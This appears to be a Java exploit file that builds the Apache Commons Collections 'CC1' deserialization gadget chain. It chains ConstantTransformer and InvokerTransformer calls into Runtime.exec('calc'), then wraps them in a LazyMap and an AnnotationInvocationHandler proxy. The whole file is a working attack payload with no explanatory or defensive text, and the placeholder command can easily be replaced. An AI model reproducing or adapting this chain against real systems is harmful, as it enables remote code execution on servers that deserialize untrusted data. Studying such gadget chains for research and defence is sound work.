package CC;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;

import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Proxy;
import java.util.HashMap;
import java.util.Map;

public class exp {
    public static void main(String[] args) throws Throwable {
        Transformer[] transforms = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"})
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transforms);
        HashMap<Object,Object> map = new HashMap<>();
        map.put("key","value");

        Map<Object,Object> decorateMap =  LazyMap.decorate(map,chainedTransformer);

        Class handler = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor con = handler.getDeclaredConstructor(Class.class, Object.class);
        con.setAccessible(true);
        InvocationHandler invocationHandler = (InvocationHandler) con.newInstance(Override.class,decorateMap);

        Proxy proxyMap = (Proxy) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(),new Class[]{Map.class},invocationHandler);
        Object exp =  con.newInstance(Override.class,proxyMap);
    }
}
